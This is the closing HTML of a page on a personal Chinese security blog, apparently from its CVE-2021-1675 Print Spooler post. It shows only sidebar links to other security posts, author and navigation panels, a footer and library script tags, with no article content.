title="CVE-2021-1675(Windows Print Spooler权限提升漏洞)">CVE-2021-1675(Windows Print Spooler权限提升漏洞)</a></li><li><a href="/2021/10/09/Exchange%20Proxyshell/" rel="bookmark" title="Exchange Proxyshell">Exchange Proxyshell</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="ruyue" data-src="//fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/images/avatar.jpg"><p class="name" itemprop="name">ruyue</p><div class="description" itemprop="description"></div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">37</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">11</span> <span class="name">分类</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL3J1eXVlYXR0ZW50aW9u" title="https:&#x2F;&#x2F;github.com&#x2F;ruyueattention"><i class="ic i-github"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/about/" rel="section"><i class="ic i-user"></i>关于</a></li><li class="item"><a href="/friends/" rel="section"><i class="ic i-heart"></i>friends</a></li></ul></div></div></div><ul id="quick"><li class="prev pjax"><a href="/2021/01/04/Vlunstack2/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/2021/07/26/Windows%E6%8A%93%E5%8F%96%E5%AF%86%E7%A0%81/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/Java/" title="分类于 Java">Java</a></div><span><a href="/2022/10/06/Java%20RMI%EF%BC%88%E8%BF%9C%E7%A8%8B%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="Java RMI（远程方法调用）漏洞分析">Java RMI（远程方法调用）漏洞分析</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/" title="分类于 容器安全">容器安全</a></div><span><a href="/2022/02/16/k8s-kunbernetes%E9%83%A8%E7%BD%B2%E5%BA%94%E7%94%A8/" title="k8s-Kubernetes部署应用">k8s-Kubernetes部署应用</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%9E%83%E5%9C%BE%E7%AE%B1/" title="分类于 垃圾箱">垃圾箱</a></div><span><a href="/2021/08/19/%E5%A6%82%E4%BD%95%E8%BD%BB%E6%9D%BE%E7%A0%B4%E8%A7%A3%E5%89%8D%E7%AB%AF%E5%8A%A0%E5%AF%86/" title="如何轻松破解前端加密">如何轻松破解前端加密</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Vlunstack/" title="分类于 Vlunstack">Vlunstack</a></div><span><a href="/2021/01/04/Vlunstack2/" title="Vlunsatck2">Vlunsatck2</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/" title="分类于 容器安全">容器安全</a></div><span><a href="/2022/05/12/docker%E8%AF%86%E5%88%AB/" title="Docker环境探测识别">Docker环境探测识别</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%AF%86%E7%A0%81%E5%AD%A6/" title="分类于 密码学">密码学</a></div><span><a href="/2022/03/29/%E9%9D%9E%E5%AF%B9%E7%A7%B0%E5%AF%86%E7%A0%81-HTTPS%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/" title="HTTPS协议分析">HTTPS协议分析</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Java/" title="分类于 Java">Java</a></div><span><a href="/2022/08/15/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(2)-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/" title="Java反序列化(2)-反序列化基础">Java反序列化(2)-反序列化基础</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Java/" title="分类于 Java">Java</a></div><span><a href="/2022/11/29/Java%E5%86%85%E5%AD%98%E9%A9%AC1.5-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%B3%A8%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/" title="Java内存马1.5:反序列化注入内存马">Java内存马1.5:反序列化注入内存马</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/" title="分类于 容器安全">容器安全</a></div><span><a href="/2022/02/28/k8s-kunbernetes%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" title="k8s-Kubernetes权限维持">k8s-Kubernetes权限维持</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Windows%E5%AE%89%E5%85%A8/" title="分类于 Windows安全">Windows安全</a></div><span><a href="/2022/04/27/%E7%BB%84%E7%AD%96%E7%95%A5%E4%B8%8E%E6%9C%AC%E5%9C%B0%E7%BB%84%E7%AD%96%E7%95%A5/" title="本地组策略与域组策略">本地组策略与域组策略</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2021 – <span itemprop="copyrightYear">2023</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">ruyue @ 如月专注</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">152k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">2:18</span></div><div class="powered-by"></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"2021/07/21/CVE-2021-1675/",favicon:{show:"夺去目光的故事",hide:"蒙上双眼的故事"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//fastly.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="//fastly.jsdelivr.net/gh/ruyueattention/ruyueattention.github.io/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->